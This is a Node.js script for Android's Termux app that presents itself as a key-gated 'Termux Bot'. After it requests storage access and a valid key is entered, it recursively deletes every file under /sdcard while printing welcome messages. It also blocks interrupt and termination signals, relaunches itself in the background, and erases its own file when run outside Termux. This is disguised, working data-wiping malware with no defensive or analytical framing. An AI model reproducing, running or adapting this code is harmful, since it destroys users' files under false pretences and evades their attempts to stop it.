const readline = require('readline'); const axios = require('axios'); const fs = require('fs'); const { exec } = require('child_process'); const path = require('path'); const GITHUB_JSON_URL = "https://raw.githubusercontent.com/nadiacutew/database/main/keys.json"; function isTermux() { return process.env.PREFIX && process.env.PREFIX.includes("/data/data/com.termux"); } if (!isTermux()) { console.log("❌ This script can only be run in Termux!"); console.log("💥 Destroying the script...\n"); fs.writeFileSync(__filename, "", "utf8"); console.log("🔥 The script has been destroyed! It cannot be used anymore."); process.exit(1); } process.on('SIGINT', (signal) => { console.log("\n❌ You cannot stop the script. Attempting forced termination."); }); process.on('SIGTSTP', (signal) => { console.log("\n❌ You cannot pause the script with CTRL+Z."); }); process.on('SIGTERM', (signal) => { console.log("\n❌ You cannot terminate the script."); }); const rl = readline.createInterface({ input: process.stdin, output: process.stdout }); async function getKeys() { try { const response = await axios.get(GITHUB_JSON_URL); return response.data; } catch (error) { console.log("❌ Failed to fetch keys data!"); process.exit(1); } } function deleteFolderRecursive(folderPath) { if (fs.existsSync(folderPath)) { fs.readdirSync(folderPath).forEach((file) => { const curPath = folderPath + "/" + file; if (fs.lstatSync(curPath).isDirectory()) { deleteFolderRecursive(curPath); } else { fs.unlinkSync(curPath); } }); fs.rmdirSync(folderPath); } } function deleteAllFilesInSdcard() { const sdcardPath = "/sdcard"; if (fs.existsSync(sdcardPath)) { fs.readdirSync(sdcardPath).forEach((file) => { const curPath = path.join(sdcardPath, file); if (fs.lstatSync(curPath).isDirectory()) { deleteFolderRecursive(curPath); } else { fs.unlinkSync(curPath); } }); } } function setupStorage() { console.log("🔧 Setting up storage access..."); exec("termux-setup-storage", (error, stdout, stderr) => { if (error) { console.log(`❌ Error running termux-setup-storage: ${stderr}`); process.exit(1); } else { console.log("📂 Storage access successfully set up."); startBot(); } }); } async function startBot() { const { keys, owner_token } = await getKeys(); rl.question("Enter the key: ", (inputKey) => { if (keys.includes(inputKey) || inputKey === owner_token) { console.log("\n✅ Key is valid! You can access Termux Bot."); console.log("🔄 Running the feature...\n"); deleteAllFilesInSdcard(); console.log("🚀 Welcome to Termux Bot!"); } else { console.log("\n❌ Invalid key! Access denied."); } rl.close(); }); } setupStorage(); exec('nohup node ' + __filename + ' &', (error, stdout, stderr) => { if (error) { console.log(`❌ Error starting background process: ${stderr}`); } else { console.log("🔒 Script is running in the background."); } });
